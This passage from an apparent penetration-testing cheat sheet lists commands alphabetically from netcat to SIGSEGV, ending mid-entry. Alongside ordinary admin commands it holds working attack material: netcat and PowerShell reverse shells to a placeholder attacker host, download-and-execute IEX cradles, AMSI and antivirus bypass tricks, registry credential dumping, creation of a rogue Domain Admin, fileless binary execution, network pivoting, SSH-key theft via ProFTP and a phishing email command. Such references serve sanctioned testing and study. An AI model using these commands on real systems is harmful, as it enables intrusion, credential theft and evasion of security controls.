```

#### Junction Creation

```cmd
C:\> mklink /H C:\PATH\TO\DIRECTORY C:\PATH\TO\DIRECTORY
```

## mkpasswd

```console
$ mkpasswd -m sha-512 <PASSWORD>
```

## mount

### Mount a NFS Share

```console
$ sudo mount -t nfs -o vers=4,nolock <RHOST>:/<FOLDER> /PATH/TO/FOLDER/<FOLDER>
```

### Mount a SMB Share using Kerberos

```console
$ sudo mount -t cifs -o user=<USERNAME>,cruid=<USERNAME>,sec=krb5 //<RHOST>/<FOLDER> /PATH/TO/FOLDER/<FOLDER>
```

## Mozilla Firefox

### Kerberos Authentication

```console
about:config
```

| Option | Value |
| --- | --- |
| network.negotiate-auth.trusted-uris | \<RHOST> |
| network.negotiate-auth.delegation-uris | \<RHOST> |
| network.negotiate-auth.using-native-gsslib | True |

```console
$ export KRB5CCNAME=<FILE>.ccache
```

```console
$ firefox
```

## mp64

### Create Custom Charset

```console
$ mp64 --custom-charset1=?l?u?d{}_ $pass?1$wildcard
```

## msg

### Converting .msg-Files to .eml-Files

```console
$ sudo apt-get install libemail-outlook-message-perl libemail-sender-perl
$ msgconvert *.msg
```

## Nano

```console
:Ex    // exit to folder structure
:w!    // write content to a specific file
:e!    // exit
```

## nc / Ncat / netcat

### Common Commands

```console
$ nc <RHOST> <RPORT>
$ nc -lvpn <LPORT>
```

### Port Scanning

```console
$ nc -nvv -w 1 -z <RHOSTS> <RPORT>-<RPORT>      // TCP
$ nc -nv -u -z -w 1 <RHOSTS> <RPORT>-<RPORT>    // UDP
```

### Ncat with SSL

```console
$ ncat --ssl -lnvp <LPORT>
```

### UDP Listener

```console
$ nc -u <RHOST> <RPORT>
$ nc -u -lnvp <LPORT>
```

or

```console
$ nc -lnvup <LPORT>
```

### File Transfer

#### Listener

```console
$ nc -lnvp <LPORT> > <FILE>
```

#### Remote System

```console
$ nc -w 5 <RHOST> <RPORT> < /PATH/TO/FILE/<FILE>
```

#### Execute powershell.exe

```console
C:\temp\nc64.exe <RHOST> <RPORT> -e powershell.exe
```

### Scanning

```console
$ nc -zv <RHOST> <RPORT>
```

### Execute Shell Commands

```console
$ nc -nvlkp <LPORT> -c "cat /PATH/TO/FILE/<FILE>"
```

## Network File System (NFS)

```console
$ sudo useradd <USERNAME>
$ sudo usermod -u <ID> <USERNAME>
$ sudo su <USERNAME>
```

## NetworkManager

```console
$ sudo systemctl start NetworkManager
$ sudo systemctl stop NetworkManager
$ systemctl status NetworkManager
```

## NFS

```console
$ sudo useradd <USERNAME>
$ sudo usermod -u <ID> <USERNAME>
$ sudo su <USERNAME>
```

## nfsshell

```console
$ sudo apt-get install libreadline-dev libncurses5-dev
$ cd nfsshell
$ make
$ ./nfsshell
```

```console
$ sudo ./nfsshell <RHOST>
nfs> host <RHOST>
Using a privileged port (1023)
Open <RHOST> (<RHOST>) TCP
nfs> export
Export list for <RHOST>:
/home                    everyone
nfs> mount /home
Using a privileged port (1022)
Mount `/home', TCP, transfer size 65536 bytes.
nfs> uid 1000
nfs> gid 1000
nfs> cd <USERNAME>
nfs> ls
```

## npx

### Unpacking .asar-Files

```console
$ npx asar extract <FILE>.asar /PATH/TO/FOLDER/
```

## nsupdate

### Zone Update

```console
$ nsupdate
> server <RHOST>
> zone <DOMAIN>
> update add <DOMAIN> 3600 A <LHOST>
> send
> quit
```

or

```console
$ nsupdate -k key
> server <RHOST>
> zone <DOMAIN>
> update add <DOMAIN> 86400 A <LHOST>
> send
> quit
```

### Read Commands from File

```console
nsupdate -k < <FILE>
```

## objectdump

### Check Binary Files

```console
$ objdump -D /lib/x86_64-linux-gnu/security/pam_unix.so | less
```

## OpenBSD

### Switch User

```console
$ doas -u <USERNAME> /bin/sh
```

### Decrypt .enc-Files

```console
$ netpgp --decrypt <FILE>.tar.gz.enc --output=/PATH/TO/FILE/<FILE>.tar.gz
```

## Outlook

### Staring Outlook without a profile

```console
Ctrl + r
outlook.exe /PIM NoEmail
Enter
```

## paste

### Example

```console
$ cat <file>
user1
text1
user2
text2
user3
text3
```

### Usage

```console
$ paste - - d, < <file>
user1,text1
user2,text2
user3,text3
```

## Perl

### Command Execution

```console
$ sudo /usr/bin/perl -e 'exec "cat /root/root.txt"'
```

## pgrep

```console
$ pgrep -lfa <PROCESS>
```

## PHP

### Interactive Shell

```console
$ php -a
```

### Perl HTTP Server

Important Note: Every Script there get's executed!

```console
$ sudo php -S 127.0.0.1:80
```

## pipenv

```console
$ pipenv shell
```

## plink

### Remote Port Forwarding

```cmd
C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:<RPORT>:127.0.0.1:3389 <LHOST>
```

## PNG

### Fix .png-File Header

```console
$ printf '\x89\x50\x4e\x47' | dd conv=notrunc of=8.png bs=1
```

## POP3

```console
USER <USERNAME>
PASS <PASSWORD>
STAT
LIST
RETR <NUMBER>
```

## Port Forwarding

### Chisel

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

#### Reverse Pivot

- LHOST < APPLICATION SERVER

##### LHOST

```console
$ ./chisel server -p 9002 -reverse -v
```

##### APPLICATION SERVER

```console
$ ./chisel client 192.168.50.10:9002 R:3000:127.0.0.1:3000
```

#### SOCKS5 / Proxychains Configuration

- LHOST > APPLICATION SERVER > NETWORK

##### LHOST

```console
$ ./chisel server -p 9002 -reverse -v
```

##### APPLICATION SERVER

```console
$ ./chisel client 192.168.50.10:9002 R:socks
```

### Ligolo-ng

> https://github.com/nicocha30/ligolo-ng

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST > APPLICATION SERVER > NETWORK

#### Download Proxy and Agent

> https://github.com/nicocha30/ligolo-ng/releases

```console
$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
```

#### Prepare Tunnel Interface

```console
$ sudo ip tuntap add user $(whoami) mode tun ligolo
```

```console
$ sudo ip link set ligolo up
```

#### Setup Proxy on LHOST

```console
$ ./proxy -laddr 192.168.50.10:443 -selfcert
```

#### Setup Agent on APPLICATION SERVER

```console
$ ./agent -connect 192.168.50.10:443 -ignore-cert
```

#### Configure Session

```console
ligolo-ng » session
```

```console
[Agent : user@target] » ifconfig
```

```console
$ sudo ip r add 172.16.50.0/24 dev ligolo
```

```console
[Agent : user@target] » start
```

#### Port Forwarding

- LHOST < APPLICATION SERVER > DATABASE SERVER

```console
[Agent : user@target] » listener_add --addr 10.10.100.20:2345 --to 192.168.50.10:2345 --tcp
```

### Socat

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST > APPLICATION SERVER > DATABASE SERVER

##### APPLICATION SERVER

```console
$ ip a
$ ip r
$ socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432
```

##### LHOST

```console
$ psql -h <RHOST> -p 2342 -U postgres
```

### SSH Tunneling

#### Local Port Forwarding

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

##### APPLICATION SERVER

```console
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ ssh <USERNAME>@192.168.100.10
$ ip a
$ ip r
$ for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445;
$ ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <USERNAME>@10.10.100.20
```

##### LHOST

```console
$ smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

#### Dynamic Port Forwarding

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

##### APPLICATION SERVER

```console
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ ssh -N -D 0.0.0.0:9999 <USERNAME>@10.10.100.20
```

##### LHOST

```console
$ sudo ss -tulpn
$ tail /etc/proxychains4.conf
socks5 192.168.50.10 9999
$ proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

#### Remote Port Forwarding

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

- LHOST <-> FIREWALL <-> APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

##### LHOST

```console
$ sudo systemctl start ssh
$ sudo ss -tulpn
```

##### APPLICATION SERVER

```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 <USERNAME>@192.168.50.10
```

##### LHOST

```console
$ psql -h 127.0.0.1 -p 2345 -U postgres
```

#### Remote Dynamic Port Forwarding

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST < FIREWALL < APPLICATION SERVER > NETWORK

##### APPLICATION SERVER

```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ ssh -N -R 9998 <USERNAME>@192.168.50.10
```

##### LHOST

```console
$ sudo ss -tulpn
$ tail /etc/proxychains4.conf
socks5 127.0.0.1 9998
$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
```

### sshuttle

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST > APPLICATION SERVER > NETWORK

##### APPLICATION SERVER

```console
$ socat TCP-LISTEN:2222,fork TCP:10.10.100.20:22
```

##### LHOST

```console
$ sshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
$ smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
```

### ssh.exe

| System              | IP address     |
| ------------------- | -------------- |
| LHOST               | 192.168.50.10  |
| APPLICATION SERVER  | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE SERVER     | 10.10.100.20   |
| WINDOWS HOST        | 172.16.50.10   |

- LHOST < FIREWALL < WINDOWS JUMP SERVER > NETWORK

##### LHOST

```console
$ sudo systemctl start ssh
$ xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

##### WINDOWS JUMP SERVER

```cmd
C:\> where ssh
C:\Windows\System32\OpenSSH\ssh.exe
C:\Windows\System32\OpenSSH> ssh -N -R 9998 <USERNAME>@192.168.50.10
```

##### LHOST

```console
$ ss -tulpn
$ tail /etc/proxychains4.conf
socks5 127.0.0.1 9998
$ proxychains psql -h 10.10.100.20 -U postgres
```

### Plink

| System              | IP address     |
| ------------------- | -------------- |
| LHOST               | 192.168.50.10  |
| APPLICATION SERVER  | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE SERVER     | 10.10.100.20   |
| WINDOWS HOST        | 172.16.50.10   |

- LHOST < FIREWALL < WINDOWS JUMP SERVER

##### LHOST

```console
$ find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
```

##### WINDOWS JUMP SERVER

```cmd
C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
```

##### LHOST

```console
$ ss -tulpn
$ xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
```

### Netsh

| System              | IP address     |
| ------------------- | -------------- |
| LHOST               | 192.168.50.10  |
| APPLICATION SERVER  | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE SERVER     | 10.10.100.20   |
| WINDOWS HOST        | 172.16.50.10   |

- LHOST < FIREWALL < WINDOWS JUMP SERVER > DATABASE SERVER

##### LHOST

```console
$ xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

##### WINDOWS JUMP SERVER

```cmd
C:\> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
C:\> netstat -anp TCP | find "2222"
C:\> netsh interface portproxy show all
C:\> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.10 localport=2222 action=allow
```

##### LHOST

```console
$ sudo nmap -sS 192.168.50.10 -Pn -n -p2222
$ ssh database_admin@192.168.50.10 -p2222
```

##### WINDOWS JUMP SERVER

```cmd
C:\> netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
C:\> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
```

## PowerShell

### Installation

#### Installation on Linux

```console
$ sudo apt-get install gss-ntlmssp
$ sudo apt-get install powershell
```

### Abbreviations

```console
ipmo    // Import-Module
-wi     // WindowStyle Hidden
```

### General Usage

```cmd
PS C:\> Get-Help <COMMAND>
```

#### Search for Files

```cmd
PS C:\> type <FILE> | findstr /l <STRING>
```

#### Create Base64 Blob of a File

```cmd
PS C:\> [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
```

#### Base64 Encoding using pwsh

```console
$ pwsh
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText
```

#### Import Module to PowerShell cmdlet

```cmd
PS C:\> Import-Module .\<FILE>
```

#### Create a .zip File

```cmd
PS C:\> Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
```

#### Unzip a File

```cmd
PS C:\> Expand-Archive -Force <FILE>.zip
```

#### Start a new Process

```cmd
PS C:\> Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
```

#### Check PowerShell Versions

```cmd
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\> powershell -Command "$PSVersionTable.PSVersion"
PS C:\> powershell -c "[Environment]::Is64BitProcess"
```

#### Check Execution Policy

```cmd
PS C:\> Get-ExecutionPolicy
```

##### Allow Script Execution

```cmd
PS C:\> Set-ExecutionPolicy remotesigned
PS C:\> Set-ExecutionPolicy unrestricted
PS C:\> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```

##### Script Execution Bypass

```cmd
PS C:\> powershell -ex bypass -File <FILE>.ps1
PS C:\> powershell -noprofile -executionpolicy bypass -file .\<FILE>.ps1
```

### Invoke-Expression / Invoke-WebRequest

```cmd
PS C:\> iwr <LHOST>/<FILE>.ps1 -o <FILE>.ps1
PS C:\> iwr http://<LHOST>/<FILE>.ps1 -o <FILE>.ps1
PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1)
PS C:\> Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
```

#### Use Kerberos Tickets

```cmd
PS C:\> iwr -UseDefaultCredentials http://<RHOST>
```

### .NET Reflection

```cmd
PS C:\> $bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
PS C:\> $assembly = [System.Reflection.Assembly]::Load($bytes)
PS C:\> $entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
PS C:\> $entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
```

### PSCredential

```console
Import-CliXml
Export-CliXml
```

### Switching Sessions in PowerShell

```cmd
PS C:\> $password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $password)
PS C:\> Enter-PSSession -ComputerName <RHOST> -Credential $cred
```

or

```cmd
PS C:\> $SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
PS C:\> $Session = New-PSSession -Credential $Cred
PS C:\> Invoke-Command -Session $session -scriptblock { whoami }
```

or

```cmd
PS C:\> $username = '<USERNAME>'
PS C:\> $password = '<PASSWORD>'
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS C:\> Start-Process powershell.exe -Credential $credential
```

```cmd
PS C:\> powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```

### Decryption

```cmd
PS C:\> $key = Get-Content ".\<FILE>"
PS C:\> $pass = (Get-Content ".\<FILE>" | ConvertTo-SecureString -Key $key)
PS C:\> $secret = (New-Object PSCredential 0, $pass).GetNetworkCredential().Password
PS C:\> echo $secret
```

### Scheduled Tasks

```cmd
PS C:\> Start-Job -ScriptBlock { C:\Windows\Tasks\<FILE>.exe }
```

### AntiVirus Handling

#### AntiVirus Bypass for Invoke-Expression (IEX)

```cmd
PS C:\> <COMMAND> | & ( $PsHOme[4]+$PShoMe[30]+'x')
```

##### Explaination

```console
$PSHome[4]     // equals "i"
$PSHome[30]    // equals "e"
+x             // adds an "x"
```

#### Alternative

```cmd
PS C:\> $eNV:COmSPeC[4,15,25]-JOiN''
```

##### Explaination

```console
$eNV:COmSPeC[4]     // equals "i"
$eNV:COmSPeC[15]    // equals "e"
$eNV:COmSPeC[25}    // equals "x"
```

#### Alternative

#### Test String

```cmd
PS C:\> $str = 'amsiinitfailed'
```

#### AMSI Bypass

```cmd
PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
```

### System

#### Show current User

```cmd
PS C:\> whoami /all
PS C:\> getuserid
```

#### Show Groups

```cmd
PS C:\> whoami /groups
```

#### Get System Information

```cmd
PS C:\> systeminfo
```

#### Get Process List

```cmd
PS C:\> Get-Process
```

#### Get net user Information

```cmd
PS C:\> net users
PS C:\> net users <USERNAME>
```

#### Get User List

```cmd
PS C:\> Get-ADUser -Filter * -SearchBase "DC=<DOMAIN>,DC=LOCAL"
```

#### Invoke-Expression File Transfer

```cmd
PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1) -UseBasicParsing)
```

#### Add new Domain Administrator

```cmd
PS C:\> $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
PS C:\> New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
PS C:\> Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
```

#### Execute Commands in User Context

```cmd
PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
```

#### Execute Scripts with Credentials (Reverse Shell)

```cmd
PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
PS C:\> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
```

#### New-PSSession

```cmd
PS C:\Users\<USERNAME>\Downloads\backups> $username = "<DOMAIN>\<USERNAME>"
$username = "<DOMAIN>\<USERNAME>"
PS C:\Users\<USERNAME>\Downloads\backups> $password = "<PASSWORD>"
$password = "<PASSWORD>"
PS C:\Users\<USERNAME>\Downloads\backups> $secstr = New-Object -TypeName System.Security.SecureString
$secstr = New-Object -TypeName System.Security.SecureString
PS C:\Users\<USERNAME>\Downloads\backups> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\Users\<USERNAME>\Downloads\backups> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\Users\<USERNAME>\Downloads\backups> new-pssession -computername . -credential $cred
new-pssession -computername . -credential $cred

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          localhost       RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\Users\<USERNAME>\Downloads\backups> enter-pssession 1
enter-pssession 1
[localhost]: PS C:\Users\<USERNAME>\Documents> whoami
whoami
<DOMAIN>\<USERNAME>
```

### Network

#### Check Port Status

```cmd
PS C:\> Test-NetConnection <RHOST> -p <RPORT>
```

#### Connect to Azure

```cmd
PS C:\> Azure-ADConnect -server 127.0.0.1 -db ADSync
```

### File Handling

#### Out-Default

```cmd
PS C:\> &{ <COMMAND> }
```

#### Read a File

```cmd
PS C:\> Get-Content <FILE>
```

#### Show hidden Files

```cmd
PS C:\> Get-ChildItem . -Force
```

or

```cmd
PS C:\> GCI -hidden
```

#### Convert a File into Base64

```cmd
PS C:\> [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
```

#### Directory Listing

```cmd
PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {ls 'C:\PATH\TO\DIRECTORY\'}
```

#### Write to a File

```cmd
PS C:\> Invoke-Command -ComputerName <COMPUTERNAME> -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'C:\PATH\TO\FILE\<FILE>' -Value '<CONTENT>'}
```

#### Move a File

```cmd
PS C:\> move-item -path C:\PATH\TO\FILE<FILE> -destination C:\PATH\TO\DESTINATION
```

#### Create a .zip-File

```cmd
PS C:\> Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
```

#### Replace Text in File

```cmd
PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -ScriptBlock{((cat "C:\PATH\TO\FILE\<FILE>" -Raw) -replace '<TO_REPLACE>','cmd.exe /c <NEW_TEXT>') | set-content -path C:\PATH\TO\FILE\<FILE>} -credential $cred
```

#### File Transfer

```cmd
PS C:\> &{ iwr -uri http://<LHOST>/<FILE>.exe -o 'C:\PATH\TO\DIRECTORY\<FILE>.exe'}
```

#### Read PowerShell History

```cmd
PS C:\> type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### Read .lnk-Files

```cmd
PS C:\> $WScript = New-Object -ComObject WScript.Shell
PS C:\> $shortcut = Get-ChildItem *.lnk
PS C:\> $WScript.CreateShortcut($shortcut)
```

## printf

```console
$ printf '<LINE1>\n<LINE2>'
```

## proc

### Working Directory

```console
$ ls -l /proc/self/cwd
```

### Log File Read

```console
$ cat /proc/self/fd/10
```

## ProFTP

```console
$ SITE CPFR /home/<USERNAME>/.ssh/id_rsa
$ SITE CPTO /var/tmp/id_rsa
```

## ProFTPD

### Add User to Database

```console
$ echo {md5}`echo -n <PASSWORD> | openssl dgst -binary -md5 | openssl enc -base64`
```

```console
mysql> INSERT INTO ftpuser (id, userid, passwd, uid, gid, homedir, shell, count, accessed, modified) VALUES ('2', '<USERNAME>', '{md5}X03MO1qnZdYdgyfeuILPmQ==', '1000', '1000', '/', '/bin/bash', '0', '2022-09-27 05:26:29', '2022-09-27 05:26:29');
```

## Python2

> https://pip.pypa.io/en/latest/development/release-process/#python-2-support

> https://github.com/pypa/get-pip

```console
$ curl https://bootstrap.pypa.io/get-pip.py | python
```

## Python

### Python HTTP Server

```console
$ python -m SimpleHTTPServer 80
$ python3 -m http.server 80
```

### Python SMTP Server

```console
$ python3 -m smtpd -c DebuggingServer -n <LHOST>:25
```

### Virtual Environments

```console
$ python3 -m venv venv
$ source venv/bin/activate
$ deactivate
```

### Unzip .zip File

```console
$ import zipfile;zipfile.ZipFile('<FILE>.zip','r').extractall('.');
```

### SyntaxError: invalid non-printable character U+200B

```console
$ sed -i 's/\xe2\x80\x8b//g'
$ sed 's/\xe2\x80\x8b//g' <FILE> > <FILE>
```

### Shell Code Conversion

```console
$ python -c 'print "\x41"'
```

### Testing Web Sockets

```console
$ python3 -m websockets ws://<DOMAIN>
```

### Fixing Crypto Error

```console
$ pip install pycryptodome
```

### Running Binaries without touching Disk

```console
$ python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("<TEXT>"); os.write(fd, http://d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p, "-h"],{})'
```

## Python TOTP

```console
$ sudo pip install pyotp
$ python3 -c 'import pyotp; totp = pyotp.TOTP("orxxi4c7orxwwzlo"); print(totp.now())'
```

## rdate

```console
$ sudo rdate -n <RHOST>
$ sudo rdate -s <RHOST>
```

## rdesktop

```console
$ rdesktop <RHOST>
```

## readpst

```console
$ readpst <FILE>
$ readpst -rS <FILE>
```

## Redirects

```console
stdin     // value 0
stdout    // value 1
stderr    // value 2
```

```console
< redirects stdin
> redirects stdout
2> redirects stderr
2>&1 redirects stderr to stdout
```

`terminal > stdin (0) program > stdout (1) > $ <COMMAND> > <FILE>.txt`
`terminal > stdin (0) program > stderr (2) > $ <COMMAND> 2> <FILE>.txt`

`sudo` doesn't affect redirects.

```console
$ sudo echo <COMMAND> > /etc/<FOOBAR>    # does not work
$ echo <COMMAND> | sudo tee /etc/<FOOBAR>    # does work
```

### Examples

```console
$ wc < <FILE>.txt                // redirect stdin
$ cat <FILE>.txt | wc            // redirect stdin
$ <COMMAND> > <FILE.txt > 2>&1    // redirect stderr to stdout
$ <COMMAND> > /dev/null           // OS ignores all writes to /dev/null
```

## regedit

### Dumping Credentials

```console
PS C:\Users\user\Downloads> reg save hklm\system system
PS C:\Users\user\Downloads> reg save hklm\sam sam
```

```cmd
C:\> reg.exe save hklm\sam c:\temp\sam.save
C:\> reg.exe save hklm\security c:\temp\security.save
C:\> reg.exe save hklm\system c:\temp\system.save
```

## rev

```console
$ echo "foobar" | rev
```

## Reverse SSH

```console
$ git clone https://github.com/NHAS/reverse_ssh
$ cd reverse_ssh
$ make
$ cd bin/
$ cat ~/.ssh/id_rsa.pub > authorized_keys
$ ./server 0.0.0.0:3232
```

```console
$ ./client -d <LHOST>:3232
```

```console
$ ssh <LHOST> -p 3232 ls -t
```

```console
$ ssh -J <LHOST>:3232 1fe03478b2775060f6643adaac57a0f5b99989b3
```

## rlogin

### Installation

```console
$ sudo apt-get install rsh-redone-client
```

### Local User Remote Login

```console
$ sudo useradd <USERNAME>
$ sudo passwd <USERNAME>
$ sudo su - <USERNAME>
$ rlogin <RHOST>
```

## rlwrap

```console
$ rlwrap nc -lnvp <LPORT>
```

## rpm2cpio

### Unpacking .rpm-Files

```console
$ rpm2cpio <FILE>.rpm | cpio -idmv
```

## rsh

```console
$ rsh <RHOST> <COMMAND>
$ rsh -l <USERNAME> <RHOST>
```

## rsync

### Connect

```console
$ nc -vn remote_ip 873
```

### List Content

```console
$ #list
```

or

```console
$ rsync --list-only -a rsync://<RHOST>/
```

### Download

```console
$ rsync -av rsync://<RHOST>/<FILE>/<REMOTE_DIRECTORY> <LOCAL_DIRECTORY>
```

## RunAs

```cmd
C:\> runas /user:"<USERNAME>" cmd.exe
```

## screen

### List Sessions

```console
$ screen -ls
```

### Attach to Session

```console
$ screen -x <NAME>
```

### Window List

```console
ctrl + a ctrl + w
```

### Window Handling

```console
ctrl + a + c    // new window
ctrl + a + n    // next window
ctrl + a +p     // previous window
ctrl + d        // detach from current window
ctrl + k        // kill current window
```

### Session Handling

```console
ctrl +a ctrl +a    // screen within screen
```

### Copy Mode

```console
ctrl + esc
```

## sendemail

```console
$ sendemail -f foobar@<DOMAIN> -t nico@<DOMAIN> -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.10.10.77 -v
```

## seq

### Create a List of Numbers

```console
$ seq 0 100
```

## SetUID Bit

```console
$ chmod 4755 <FILE>
```

## sftp

```console
$ ftps -P <RPORT> ftpuser@<RHOST>
$ sshfs -p <RPORT> ftpuser@<RHOST>: /mnt/<FOLDER>
```

## showmount

```console
$ /usr/sbin/showmount -e <RHOST>
$ sudo showmount -e <RHOST>

$ chown root:root sid-shell; chmod +s sid-shell
```

## SIGSEGV

```console
$ sleep 50 &
